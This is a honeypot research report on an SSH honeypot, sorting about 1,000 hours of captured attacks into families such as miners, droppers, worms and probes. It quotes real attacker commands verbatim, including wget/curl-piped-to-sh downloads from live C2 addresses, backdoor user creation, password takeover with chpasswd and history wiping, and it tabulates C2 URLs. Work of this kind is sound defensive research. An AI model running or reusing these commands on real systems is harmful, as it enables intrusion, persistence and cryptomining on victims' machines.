# Findings - 1057h on a public VPS

Helsinki VPS, port 22, fresh IP, no prior reputation.
Data: 2026-05-26 11:37 UTC to 2026-07-09 13:31 UTC.

```
38515 auth attempts
 2012 unique source IPs
18986 unique passwords tried
35727 sessions accepted
6640574 commands captured
   15 attack families identified
```

*(Previous snapshot: 749h, 25339 attempts, 1516 IPs, 22551 sessions, 4298306 commands -- 2026-06-26)*

## What changed Jun 26 -> Jul 9 (latest pull)

```
                    Jun 26      Jul 9       delta
auth attempts        25339      38515      +13176
unique source IPs     1516       2012        +496
sessions accepted    22551      35727      +13176
commands captured  4298306    6640574    +2342268
unique passwords     13629      18986       +5357
```

## What changed Jun 25 -> Jun 26

One day of data, steady state. No new family.

```
                        Jun 25        Jun 26        delta
auth attempts            25026         25339         +313
unique source IPs         1463          1516          +53
sessions accepted        22238         22551         +313
commands captured      4047599       4298306       +250707
unique passwords         13506         13629         +123
```

- **ELF echo injector (F10) still the sole command driver.** +250k commands in ~25h.
  Period 9 echo count: 4,273,296 out of 4,297,018 total commands in that period.
  Session count now ~102 (45.12.1.49: 66 sessions, 152.89.61.139: 36 sessions).

- **`\ufeff------fuck------` climbed to 155, `---fuck_you----` to 80.** Both entered
  the top 12. The BOM-prefix artifact persists -- same wordlist, same copy-paste origin.

- **`1234` nearly tied `123456`.** 302 vs 304, both behind `admin` (674). The gap
  between them closed significantly since Jun 25.

- **AsyncSSH Vietnamese cluster: 956 sessions total** (from 27.79.x.x, 116.99.x.x,
  116.110.x.x, 171.231.x.x, 171.243.x.x ranges). Still the main source of new IPs.

- **Credential feedback loop: 12 confirmed passwords, 8 still pending loop-back.**
  One candidate crossed back since Jun 25. Pending: 8 chpasswd-only passwords watching.

Per-family session counts as of Jun 26 (estimate -- fingerprint detector):

```
SSHCHK             ~15200+  (main IP 103.105.67.170 still frozen at 14793)
astats / w.sh         910+  (was 900+)
minimal scanner       245+  (was 240+)
ELF echo injector     102   (was ~90, two source IPs: 45.12.1.49 + 152.89.61.139)
password changer      147+  (was 146+)
meow + C2 dropper     115+  (was 115+)
Diicot GPU miner       49   (unchanged)
VPS scout              37   (unchanged)
```

---

## What changed Jun 21 -> Jun 25

Four more days, mostly steady-state. No new family.

```
                        Jun 21        Jun 25        delta
auth attempts            23993         25026        +1033
unique source IPs         1279          1463         +184
sessions accepted        21205         22238        +1033
commands captured      3518383       4047599       +529216
unique passwords         13099         13506         +407
rejected                  2788          2788            +0
```

- **ELF echo injector (F10) keeps driving the command count.** +529k commands in 4 days,
  almost entirely `echo` chunks. Still ~4-6 sessions/day from 152.89.61.139 (Ukraine) and
  45.12.1.49. C2 IPs 195.177.94.72:564 and 45.88.91.135:35146 remain unreachable so
  every session falls back to hex injection.

- **`admin` overtook `123456` as top password.** 657 vs 299. Possibly a change in the
  dominant wordlist rotation hitting the IP; previously they were close.

- **Two new passwords in the top 12:** `alpine` (92) -- Alpine Linux / container default --
  and `lab123` (82), which suggests educational-environment targeting. Both are new enough
  that they weren't in the Jun 21 top list.

- **AsyncSSH Vietnamese cluster still expanding.** Another +60 IPs (27.79.x.x VNPT,
  116.99.x.x, 116.110.x.x, 171.231.x.x, 171.243.x.x). Each IP sends 15-50 attempts
  then goes quiet; the cluster rotates through residential ranges.

- **BOM-prefixed credentials growing.** `\ufeff------fuck------` 125 -> 146,
  `---fuck_you----` 69 -> 76. Unusual encoding -- the BOM prefix suggests the wordlist
  was copy-pasted from a Windows editor at some point and the artifact stuck.

- **`103.105.67.170` (SSHCHK) still frozen at 14793.** No new traffic from that IP
  since Jun 15. SSHCHK total session count likely still climbing from other IPs
  in the same infrastructure.

- **Credential feedback loop now has 12 confirmed passwords** (same chpasswd values seen
  again as login attempts from different IPs). 9 additional candidate passwords in the
  chpasswd stream have not yet looped back.

Per-family session counts as of Jun 25 (estimate -- fingerprint detector):

```
SSHCHK             ~15200+  (main IP frozen, others still scanning)
astats / w.sh         900+  (was 870)
minimal scanner       240+  (was 235)
password changer      146+  (was 144)
meow + C2 dropper     115+  (was 113)
ELF echo injector      90+  (was 84)
Diicot GPU miner        49   (unchanged)
VPS scout               37   (unchanged)
```

---

## What changed Jun 15 -> Jun 21

The two things that drove the last snapshot both went quiet, and two slower
trends took over.

```
                        Jun 15        Jun 21        delta
auth attempts            22104         23993         +1889
unique source IPs          923          1279          +356
sessions accepted        19316         21205         +1889
commands captured      2544806       3518383       +973577
unique passwords         12298         13099          +801
rejected                  2788          2788            +0
```

- **SSHCHK plateaued.** 15071 -> 15106 sessions (+35 in six days). The ~940/day
  flood that defined Jun 10-15 stopped almost dead around Jun 15. The IP behind
  most of it, `103.105.67.170`, is frozen at 14793 attempts -- zero new traffic.
  Whatever scanning list we were on got rotated off, or that node went down.

- **ELF echo injector (F10) accelerated.** 62 -> 84 sessions (+22), +856k echo
  chunks. It is now the sole driver of the command count -- nearly all of the
  +973k new commands are its hex `echo` chunks. `/tmp/amd64`, `/tmp/kal64` and
  `/tmp/linux` all grew; `/tmp/kswpad` is frozen at 229,971 (the new sessions
  ended or branched before re-injecting it).

- **AsyncSSH Vietnamese cluster expanded.** The `SSH-2.0-AsyncSSH_2.1.0` banner
  went 728 -> 896, spread across ~40 distinct residential IPs (27.79.x.x VNPT,
  171.231.x.x, 116.99.x.x, 116.110.x.x). This Python credential-stuffing botnet
  is now the main source of *new* unique IPs.

- **Scanner tooling diversified.** PuTTY_0.84 558 -> 1213, OpenSSH_7.4 346 -> 854,
  plus first sightings of `paramiko_5.0.0`, `ssh2js1.17.0` (Node.js ssh2 lib),
  `AsyncSSH_2.23.0`, `OpenSSH_10.3p1`, and the `libssh_0.11.3 / 0.10.5 / 0.7.4`
  family.

- **Credential feedback loop persists.** New post-accept loop IPs: `41.250.181.190`
  (18), `196.69.82.45` (9), `105.158.231.168` (9). The Diicot spray
  (`postgres` / `e3@HJgr=$4in-a-`, 57 IPs in 59 min) is unchanged. The obnoxious
  BOM-prefixed `------fuck------` (125) and `---fuck_you----` (69) credentials
  climbed; `nutanix/4u` (39) and `ubnt` (37) appear as new IoT defaults.

- **No new family.** Still 14. 17 sessions flagged SCP uploads this window (F13
  worm / F14 region); quarantine not re-pulled yet, so no new payload confirmed.

Per-family session counts (fingerprint detector) as of Jun 21:

```
SSHCHK             15106   (was 15071 on Jun 15)
astats / w.sh        870   (was   714)
minimal scanner      235   (was   189)
password changer     144   (was   135)
meow + C2 dropper    113   (was   113)
ELF echo injector     84   (was    62)
Diicot GPU miner      49   (was    49)
VPS scout             37   (was    37)
```

---

## Why medium interaction, not low

I started this project aiming for low interaction -- just log auth attempts and see what
credentials bots try. That was the plan.

Then the first logs came in. I saw a GPU miner checking lspci and nvidia-smi. I added
fake GPU output, and suddenly the miner ran its full kill chain instead of exiting. I was
getting real behavior, not just credential lists.

Then I saw the SCP dropper trying 11 directories. I added the SCP wire protocol so the
bot thought its uploads worked and kept going. I added a quarantine directory so I could
capture what it actually sent.

By June 2 the quarantine had caught a real payload -- a Raspberry Pi SSH worm. The ELF
echo injector had dropped four binaries into the session FS. The SSHCHK proof-of-work
was passing because I'd implemented arithmetic expansion with a real recursive descent
parser.

At some point the "low interaction" label stopped being accurate. The code has a stateful
per-session virtual filesystem, ~80 registered command handlers, real pipe chains (stdout
fed as stdin to the next stage), `$((expr))` arithmetic expansion, and the full SCP wire
protocol on both the exec and interactive shell paths. That is medium interaction by any
reasonable definition -- it is closer to Cowrie than to a simple auth logger.

The gaps are real: no `$(cmd)` substitution, no `> file` writes, no live network. But
those gaps do not push it back to low. Low means no shell. This has a shell.

---

## Timeline

Not continuous. Two big waves, one quiet day.

```
2026-05-26     88 commands  -- first bots, mixed families
2026-05-27    545 commands  -- Diicot heavy day
2026-05-28     10 commands  -- quiet
2026-05-29    174 commands  -- threshold=1 deployed, new families appear
2026-05-30  60206 commands  -- family 10 first session, 78min, 4 binaries
2026-05-31 102653 commands  -- family 10 again, family 11 first appearance
2026-06-01 100196 commands  -- family 10 hits 4x, family 6 surge (7 hits in 2h)
2026-06-02 ~507000 commands -- F10 dominates, new 1h9min session (0256bdb274ae), F12 and F13 confirmed
2026-06-03  ~1800 commands  -- quiet, ongoing
2026-06-04  ~7100 commands  -- partial day (data up to 21:37 UTC)
2026-06-06 to 06-09        -- F13 SSH worm returns 3 more times (same hash, same bot)
2026-06-10 to 06-11        -- SSHCHK surge, ~940 sessions/day sustained
2026-06-12  F14 first hit  -- architecture prober (hw.bin), 2 ELF test binaries via SCP
2026-06-14                 -- F13 worm hits again (5th quarantine capture total)
2026-06-15  ongoing        -- F10 echo injector at 62 sessions total, 2.44M chunks
2026-06-22 to 06-25       -- steady state: F10 still injecting (~4-6/day), AsyncSSH cluster
                              still expanding (+~60 IPs), no new family, admin overtakes
                              123456 as top credential (657 vs 299)
2026-06-26                -- steady state continues: F10 at ~102 sessions, +250k commands/day,
                              \ufeff------fuck------ and ---fuck_you---- both enter top 12,
                              1234 nearly ties 123456 (302 vs 304)
```

Peak: 22:00 UTC, 1321 total attempts across all sessions at that hour (1279 on 2026-05-27 alone).

Almost everything is `SSH-2.0-Go` -- the scanning ecosystem runs on Go's ssh library.
No OpenSSH overhead, thousands of connections per second from a laptop.

---

## Attack families

### 1. Credential stuffing

A wordlist + a script that tries every password on every IP it can reach. That's it.

Works because people reuse passwords. A breach at site A leaks millions of real passwords.
Some of those work at site B. The bot doesn't know your password -- it knows A password
that has a decent chance of being yours.

Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`. All from the RockYou
wordlist, 14 million passwords from a 2009 breach, still the standard.

One IP (`71.227.179.172`) tried 1545 passwords then made 1382 more after getting in.
It's not stopping when it gets a shell -- it wants every working credential, not just one.

One bot sent ~80 passwords in `YYYYMMDD` format (19870825, 19831215...) mixed with
Chinese names (yangchao, wangming, xiaodong). Birth years 1982-1991. That's a real
breach dataset from China, not guessing.

---

### 2. Diicot -- GPU miner

Dominant family. ~180 sessions. Wants to mine Monero on GPU servers.

Monero = cryptocurrency, untraceable, GPU-minable. A Tesla T4 makes real money mining it.
The bot is picky -- it only deploys on machines worth mining on.

Kill chain:

```bash
uname -s -v -n -r -m    # is it Linux x86_64? if not, exit
nproc                    # CPU count
lspci | egrep VGA && lspci | grep 3D    # GPU on the PCI bus?
nvidia-smi -q | grep "Product Name"     # which GPU exactly?
```

Our fake `lspci` shows a Tesla T4. That triggered the next step:

```bash
crontab -r                              # wipe all cron jobs
chattr -iae ~/.ssh/authorized_keys      # make authorized_keys immutable
rm -rf /dev/shm/.x /...                # kill competing miners
```

`chattr -i` is below normal Unix permissions -- even root can't touch that file without
removing the flag first. Once this runs, no other attacker can add their SSH key.
The machine is claimed.

Named after Romania's anti-corruption agency -- the malware author is trolling.

![Diicot session replay](https://github.com/user-attachments/assets/7fce6ce8-85ea-4983-b20b-8cf5eab0e524)

*Session dc727dd9b39f -- 10 commands, 36s. The last exec line is the full kill chain: wipes crontab, locks authorized_keys with chattr, kills competing miners, then deploys.*

---

### 3. SCP dropper

One session 2026-05-26 17:50. Tried 11 directories looking for a writable path:

```bash
mkdir /lib/xlxeavrjsw      ; scp -t -r /lib/xlxeavrjsw/
mkdir /dev/shm/omlvyoqxmgd ; scp -t -r /dev/shm/omlvyoqxmgd/
mkdir /tmp/cygmfsqpwkgd    ; scp -t -r /tmp/cygmfsqpwkgd/
# ... 8 more
```

`scp -t` = server-side receive mode. The bot pushes a file from its machine to ours.
Random 10-char dir names to avoid collisions.

The honeypot speaks the SCP wire protocol (sends the ready byte, parses headers, acks),
so the bot thought all 11 uploads worked. Nothing was actually received.

![SCP dropper session replay](https://github.com/user-attachments/assets/a60ec157-bbe7-479d-85c4-9bc6e4b12c6b)

*Session d22ff677d549 -- 22 commands. Each line is a different directory tried: mkdir then scp -t immediately after. Systematic bruteforce, random 10-char names, all returned exit 0.*

---

### 4. Password changer

4 sessions, 2026-05-26 22:xx to 2026-05-27 01:xx.

```bash
cat /etc/passwd
passwd
echo 'root:$MWtB6=$e6mK#=E' | chpasswd
```

Changes the root password to lock out other attackers. Tries interactive `passwd` first,
falls back to `chpasswd` which reads from stdin -- no terminal needed.

Passwords seen: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Strong, machine-generated.
The logic: bots are scanning the same ranges simultaneously. Get in first, change the
password, nobody else can use the machine.

![Password changer session replay](https://github.com/user-attachments/assets/c0dd6abe-c4c2-4f60-aa40-7152b37d4d7a)

*Session 29e4813a04ad -- 4 commands, 2s. `passwd` fails silently, falls back to `chpasswd` with a machine-generated strong password. The whole thing runs and exits before a human could type the first command.*

---

### 5. C2 dropper -- fileless

First appeared 2026-05-29 07:56, 1h41m after switching to threshold=1.
Multiple IPs, same payload.

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
(wget --no-check-certificate -qO- https://14.46.136.77/sh \
 || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

Three things:
- `uname -a` -- OS info sent back to C2
- `echo -e "\x61..."` -- decodes to `auth_ok`. Signals the C2 that auth worked.
- `wget ... | sh` -- downloads a script and runs it directly in memory. Nothing on disk.

No file = nothing for antivirus to find. The script runs and exits, only evidence is
in memory and process table while running.

`-s ssh` tells the script how it got in. Same dropper used for web exploits and RCE --
the entry vector changes what persistence it sets up.

Ran via SSH exec channel (not interactive shell) -- the original scripts missed it entirely.

![C2 dropper session replay](https://github.com/user-attachments/assets/ef6c4883-dbea-45ca-aed6-b68da18d49c2)

*Session a7a62f0046ee -- 1 command, 0s. The hex in the echo decodes to `auth_ok` -- it beacons the C2 that authentication succeeded before pulling and executing the payload.*

---

### 6. w.sh / astats -- persistence bot

First 2026-05-29 14:17. Hits every 30-45min from different IPs.

```bash
# find writable dir
sh -c 'for d in /dev/shm /tmp /var/run ...; do cd "$d" && pwd && break; done'
# drop script
cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
# cron persistence
CRON="$(crontab -l 2>/dev/null || true)"
# systemd persistence
sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service'
# drop miner
cat > astats
```

Two persistence mechanisms at once -- cron AND systemd user service. Remove one,
the other revives the miner.

Process names: `astats`, `netai`, `kstats`. Look like monitoring tools in `ps aux`.

![w.sh persistence session replay](https://github.com/user-attachments/assets/4e2c3a3c-9924-4baf-8707-1ff991107ec8)

*Session 95bd06bfef71 -- 11 commands, 9s. Cron entry and systemd service written in the same session. The last three lines drop the miner binary three times -- /dev/shm first, then /tmp as fallback.*

---

### 7. VPS infrastructure scout

Two sessions 2026-05-29. 35 commands, no payload.

Checks everything: CPU model, distro (apt/yum/pacman/zypper), network interfaces,
running services, shadow file, disk I/O with `dd`, outbound connectivity via ping.

The `dd bs=1M count=10` benchmark is the tell -- it's measuring disk speed before
deciding if the machine is worth deploying a miner on.

Ended without deploying anything. Machine failed some criterion or it's a pure probe
that reports back to a queue.

![VPS infrastructure scout session replay](https://github.com/user-attachments/assets/37168a2a-fcda-4b73-a9ec-94aef7c55030)

*Session e1877e76a176 -- 35 commands, no payload. Checks package managers, disk speed, network, shadow file. Ends without deploying anything -- the machine passed or failed some internal scoring and the result went back to a queue.*

---

### 8. SSHCHK -- C2 liveness check

**~15,200+ sessions as of Jun 26** (~940/day from June 10-15, then plateaued -- main IP 103.105.67.170 frozen at 14793 since Jun 15, other IPs in the same infrastructure still trickling). Started with 2 sessions on May 30.

2026-05-30 02:20 and 02:23. Two sessions, different IPs, 3 min apart.

```bash
echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; \
df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
```

Four things:
- `BEGIN`/`END` markers -- C2 extracts everything between them. Token is unique per
  session, prevents replay attacks.
- `uname -srm` -- OS + kernel + arch
- `echo $((7*191+3))` = 1340 -- math proof-of-work. Shell must evaluate it. A fake
  or broken shell returns the wrong answer.
- `df -P / | awk 'NR==2{print $1}'` -- device name of root filesystem

No follow-up commands. Pure inventory probe -- C2 reads the output and decides
what to send next, externally.

We had to fix the fake shell to pass this check: add arithmetic expansion `$((expr))`,
awk NR==N condition, df -P flag, uname -srm case.

![SSHCHK session replay](https://github.com/user-attachments/assets/e96a9455-3cbe-47c6-9870-8913fb62f7f7)

*Session f63b5f809061 -- 1 command, 0s. The token `5718926f9304` is unique to this session. The C2 strips everything between BEGIN and END and parses the output -- OS, kernel, proof-of-work result, and disk device -- without ever asking for them separately.*

---

### 9. Minimal OS scanner

2026-05-30 06:03 and 07:39. Two sessions, different IPs, 1h36m apart.

```bash
uname -s -m
```

Just that. Gets "Linux x86_64", disconnects. Either cataloguing the internet or
a first-stage probe before a payload bot follows up.

![Minimal OS scanner session replay](https://github.com/user-attachments/assets/93dc0bd0-4f69-4395-819e-9e56007539ab)

*Session d52879b810e9 -- 1 command, 3s. Gets the answer it needs and disconnects immediately. Lightest possible post-auth probe in the dataset.*

---

### 10. ELF echo injector

**~102 sessions total as of Jun 26. ~4,273,296 echo commands in period 9 alone. Still the sole driver of the command count.**
Two source IPs: 45.12.1.49 (66 sessions) and 152.89.61.139 (36 sessions).
session.log is well over 3.3GB mostly because of this family. kswpad was frozen
since June 15 -- the newest sessions appear to skip or branch before re-injecting it.

Single session eb342541b5, 2026-05-30 12:18-13:36 Rabat (78 minutes).
Source IP: 152.89.61.139 (Ukraine). Appeared 17 minutes after deploying the new binary.

Four binaries, injected in sequence. Each one: arch check, try wget then curl from two
C2 servers, fall back to hex echo injection when downloads fail, chmod 777, execute,
delete, then move to the next binary.

```
amd64  -- 5MB, 64-bit Go, stripped
kal64  -- 3MB, 64-bit Go, stripped
kswpad -- 1.2MB, ELF 32-bit x86
linux  -- 1.3MB, ELF 32-bit x86, UPX packed
```

C2 servers tried:
- 195.177.94.72:564 and 195.177.94.72:3594 (two ports, same server)
- 45.88.91.135:35146

Both refused connections (fake wget returns errors). So the bot wrote all four binaries
as hex via 43,058 `echo -e -n` chunks -- the entire payload delivered inside the SSH
session itself.

Each server exposes three path prefixes per binary: `/b/`, `/s/`, `/t/`. Meaning of `/t/`
unknown -- `/b/` and `/s/` are likely "binary" and "script" but `/t/` has no obvious read.

`\x7f\x45\x4c\x46` = ELF magic number. Every Linux binary starts with these 4 bytes.

This is in-band payload delivery -- the payload travels inside the attack, no separate
download needed. Used when outbound HTTP is blocked. The bot carries its full toolkit
in memory and reconstructs it on the target via shell.

All four were chmod 777'd, executed, and deleted. Session ended at 13:36 after `linux`
was deleted. 43,058 echo commands total.

Binary analysis pending -- all four recoverable from session.log hex chunks, also
downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
Ghidra work yet.

Hit a second time on 2026-05-31 (session eadedac033be). Started 08:37 Rabat, ended
10:58 Rabat -- 1h21min, 43,314 log lines. Same kill chain, same C2 IPs, path changed
from `/b/amd64` to `/s/amd64`. Same four binaries in the same order. C2 still live.

Hit again on 2026-06-02 (session 0256bdb274ae, 45.12.1.49). Started 13:35 Rabat, ended
14:45 Rabat -- 1h9min. Same C2 IPs (195.177.94.72:564, 45.88.91.135:35146), same
`/s/amd64` path, same fallback to hex echo injection when downloads fail. Period 9
total: 506,989 echo commands -- F10 has run enough times to dwarf everything else combined.

![ELF echo injector session replay](https://github.com/user-attachments/assets/e0e2ebce-5f56-48a9-bc47-deba8402e58c)

*Session eadedac033be -- 43,314 commands, 1h21min. Each block is one binary written as hex chunks via echo. wget/curl tried first, failed, then the bot rebuilt the entire payload from shell commands alone.*

---

### 11. Meow dropper -- backdoor + credential harvesting

**113 sessions as of June 21 (unchanged since June 15).** C2 infrastructure expanded: two new IPs added around June 5.
- 34.11.111.237 -- original (May 31)
- 35.237.91.38 -- new
- 34.181.210.37 -- new

All three serve the same `/meow` and `/meowarm64` binaries with the same kill chain.

Two hits 2026-05-31 01:09 and 01:12 UTC, from different IPs, same C2 at 34.11.111.237.

```bash
cd /tmp; ulimit -n 1020000; rm -rf meow*
wget http://34.11.111.237/meow; chmod 777 meow; ./meow
wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64
echo $(whoami):modzmodz | chpasswd
useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1
useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd
echo -n 'root:webserver' > /tmp/mew
```

Drops both x86-64 and ARM64 binaries in one shot -- covers both architectures without
checking first. Creates two persistent backdoor users (admin1, user1) both with sudo.
Changes the current user's password to `modzmodz` too.

The `/tmp/mew` line is the tell: writing a credential string to a predictable path.
The second hit had `root:fuck123` instead of `root:webserver` -- same tool, different
parameter. Either two operators sharing the same infrastructure, or a parameterized
campaign where each node gets a different credential to harvest.

Entire kill chain in a single command, run via SSH exec channel (not interactive shell).
No recon, no persistence check -- just drop, execute, and leave.

Binary analysis not done yet. What `meow` actually does is unknown.

A second activity from the same C2 server (197.255.229.88:1987, unrelated to the three
GCP IPs above) was observed in the Jun 26 replay: SSH key injection via `/kon` appended
to `~/.ssh/authorized_keys`, then a secondary payload fetched from `/fav.ico`. The fetch
uses a 6-method fallback chain: curl -> wget -> python3 urllib -> python2 urllib -> perl
LWP -> raw TCP socket with bash /dev/tcp. More robust than anything else in the dataset.
Whether this is the same operator or a different one using overlapping infra is unknown.

![Meow dropper session replay](https://github.com/user-attachments/assets/4507138a-7d2e-4421-b960-ff7adf8893dc)

*Session 72a973e0ba30 -- 1 command, 7s. The entire kill chain in a single exec: download, execute, create two backdoor users, change password, write credential to /tmp/mew. Done before you could read the first line.*

---

### 12. wowo dropper -- deploy and vanish

One session June 2 01:53 UTC, session d9ddf36a96. Source IP 172.210.53.193.

```bash
chmod 777 /usr/bin/curl
cd /tmp
curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86
chmod 777 runningaway.x86
./runningaway.x86 vipies
rm -rf runningaway.x86
history -c
```

Downloads a binary called `runningaway.x86` from `wowo.biz.id`, executes it with
argument `vipies`, deletes it, wipes history. The argument is probably a campaign tag --
different operators or deployments get different tags so the C2 can track them.

`chmod 777 /usr/bin/curl` at the start is unusual. Either it's fixing permissions a
previous attacker broke, or it's a habit from environments where curl gets locked down.

I don't know what `runningaway.x86` does. I haven't analysed it. The domain `wowo.biz.id`
is Indonesian (.id TLD, .biz subdomain). Beyond that I have nothing. The session came
from the same IP as F13 (172.210.53.193) which is interesting -- same machine running
multiple families, or same campaign infrastructure.

Session preceded by a full F7-style 35-command recon (session 517b6d0aebb3). The wowo
deploy only happens if the recon passes some internal check. I need to understand what
that check is.

TODO: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, analyse the binary,
figure out the relationship between F7 recon and F12 deploy.

---

### 13. gJw27HGL -- SSH worm (two-bot pattern)

**5 quarantine captures: Jun 2, Jun 6, Jun 8, Jun 9, Jun 14. Same 4.7KB script every time
(sha256: 6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b). Still active.**

Two sessions June 2 09:40 UTC. What looked like a coordinated two-stage attack: one bot
uploads a file to `/tmp/gJw27HGL` via SCP, a different IP executes it. The executor
actually showed up 3.5h earlier at 06:06 -- before the upload. They're not coordinated,
they just both hit the honeypot independently.

The quarantine captured the payload. It's a bash script, 4.7KB. I haven't done a proper
analysis yet -- I know what's in it from reading the source but I don't understand the
full picture: what the IRC channel is used for, who operates it, what the binaries it
references actually do, whether it's a known family. What I can see from the script:

- kills a list of competing processes before doing anything
- adds an SSH key to /root/.ssh/authorized_keys
- connects to IRC and waits for commands
- spreads itself via SSH using `sshpass` with hardcoded passwords

The passwords it tries are Raspberry Pi defaults. So it's targeting Pi devices, not
generic servers. Why it hit a Helsinki VPS running Ubuntu I don't fully understand yet --
probably just spraying everything on port 22.

This is the first real attacker payload the quarantine actually captured. Previous file
in quarantine was my own test from dropper_sim.go.

Analysis pending. I need to learn IRC C2 basics and how to trace a bash script's network
behavior before I can say anything meaningful about this one.

---

### 14. Architecture capability prober

One session 2026-06-12 12:54-13:00 Rabat. Source IP: 185.129.62.63. Client: SSH-2.0-OpenSSH_9.9 --
the only hit in the dataset using a real modern OpenSSH client, not a scanner library.
Single auth attempt with password `root`.

Kill chain:
```bash
LC_ALL=C top -bn1                          # snapshot running processes
scp -t /bin/tz7n3j1l8apie4kgjj19caibdc    # upload 64-bit ELF to /bin/ via SCP
LC_ALL=C /bin/tz7n3j1l8apie4kgjj19caibdc  # execute it
LC_ALL=C rm -f /bin/tz7n3j1l8apie4kgjj19caibdc  # delete it
scp -t /bin/tz7n3j1l8apie4kgjj19caibdc    # upload 32-bit ELF (same path)
LC_ALL=C /bin/tz7n3j1l8apie4kgjj19caibdc  # execute it
LC_ALL=C rm -f /bin/tz7n3j1l8apie4kgjj19caibdc  # delete it
```

The quarantine captured both uploaded binaries:

```
e374a7ad447d2cf791ecae122894a51ba723901ea132e7fa16cd47c44e4a1769  512B  ELF64 x86-64
f74a8b06db4f8f48f4a19ea5c01bade2a0dfb9290c4ed04a3f1a3eaa298a843d  348B  ELF32 x86
```

Both are handcrafted assembly "Hello, world!" programs -- the absolute minimum ELF:
write(1, "Hello, world!\n", 14) then exit(0). Two syscalls, no libc, no imports.
The 64-bit version uses `syscall` instruction; the 32-bit uses `int 0x80`. The binaries
are 512B and 348B because ELF overhead dominates -- the .text sections are 39 and 34 bytes.

This is a capability test. The attacker uploads a known-working binary and checks whether
it executes on the target before deploying the real payload. Testing both x86-64 and x86
in the same session means the follow-up deployment is architecture-agnostic and the prober
is figuring out which format to use.

The `/bin/` path is deliberate -- writable on some misconfigured systems, looks less
suspicious than `/tmp/` in `top` output.

`top -bn1` before the drop reads the process table. Either checking for competition (other
malware) or timing -- some malware delays execution until load is low.

The random 26-character filename (`tz7n3j1l8apie4kgjj19caibdc`) avoids collisions.
Same name reused for both drops since the first is deleted before the second upload.

45 minutes before this session, a VPS scout (F7) ran from 85.215.175.242 (SSH-2.0-Go),
running the full 35-command recon including `dd` disk benchmark. Different IP, different
client. Could be two bots in the same pipeline, or two independent actors that happened
to hit the same minute-window. The F12/F7 pairing set precedent for this two-stage
pattern, so I'm suspicious of it being coordinated. Neither IP came back after June 12.

The real payload was never sent. Either the honeypot's fake `top` output (or a fake
execution response) failed some check, or the real deployment goes to a separate queue
and hasn't happened yet.

---

### 15. SSH liveness/capability probe

**14954 sessions, 3 IPs, 98.9% from 103.105.67.170. Campaign span on that IP: ~4.5h,
2026-06-15, single burst.**

```bash
echo -e "\x6F\x6B"
```

Decodes to "ok". Single standalone command, no framing, no recon, no follow-up.
Zero cross-cluster overlap with any other family -- this is the IP's only behavior
across all 22551 sessions in the dataset.

14793 sessions from one IP in under 5 hours is one connection every ~1-2 seconds.
Consistent with an automated mass-scan sweep, not a persistent monitor.

My read: testing whether the exec channel executes and echoes back. If the C2 sees
"ok", the target is live. If it sees garbage or nothing, the shell is fake or broken.
Decision is made externally -- nothing more follows. Could be a pre-stage gate for a
follow-up we never saw, or pure cataloguing.

---

## Effect of auth-threshold=1

Deployed 2026-05-29 06:15 UTC. Accept any password on first attempt.

```
                before    after
attempts          102       143   +40%
unique IPs         12        41  +242%
single-shot         5        27  +440%
accepted            8       143 +1688%
commands            6       234 +3800%
new families      none    5 new
```

Families 5-10 are all single-shot -- they try once, get rejected, leave without a trace.
Under threshold=10 they were completely invisible.

Verified in logs: C2 dropper first hit at 07:56 (1h41m after change), VPS scout at
09:48, w.sh bot at 14:17. Zero sessions of these families in the 68h before the change.

---

## What the honeypot was good at

**GPU bait worked.** Fake Tesla T4 in lspci triggered Diicot's full kill chain. Without
it, they would have exited at "no GPU found".

**SCP handler kept bots engaged.** Speaking the wire protocol meant the SCP dropper ran
all 11 attempts instead of dying on the first rejection.

**Returning exit 0 everywhere** kept bots progressing through their playbook.

**URL logging (added late).** wget/curl now log their URL argument. Family 10 URLs
captured within 17 minutes of deploying.

## Confirmed C2 infrastructure (from replay--2026-06-26)

Extracted from session replay, confirmed in raw session.log:

| Family | URL | Notes |
|--------|-----|-------|
| F2 Diicot | `http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | payload saved to `~/.sysmonitor`, chmod+exec |
| F5 dropper | `https://14.46.136.77/sh` | wget/curl piped to sh, fileless |
| F6 w.sh | `http://91.239.211.89/init.sh` | tried /tmp, /var/tmp, /dev/shm |
| F11 Meow | `http://197.255.229.88:1987/fav.ico` | payload, curl/wget/python/perl/tcp fallback chain |
| F11 Meow | `http://197.255.229.88:1987/kon` | SSH public key, appended to authorized_keys |
| F12 wowo | `http://wowo.biz.id/wowiloveyou/runningaway.x86` | chmod 777, executed as `./runningaway.x86 vipies`, self-deleted |

F10 C2 uses two ports on 195.177.94.72: 564 (documented) and 3594 (also observed).
Both servers (195.177.94.72 and 45.88.91.135) serve /b/, /s/, and /t/ paths for each binary.

---

## What I missed

**The C2 payload at 14.46.136.77/sh** -- pipes into sh, the honeypot can't make real HTTP calls.

**The 4 binaries from the ELF injector session** -- recoverable from session.log hex chunks,
also downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
analysis yet.

**Interactive shell SCP** -- now fixed. Next SCP dropper session might upload for real.

**$() subshell substitution** -- not implemented. Some bot commands use it and get
empty strings back instead of the right answer.
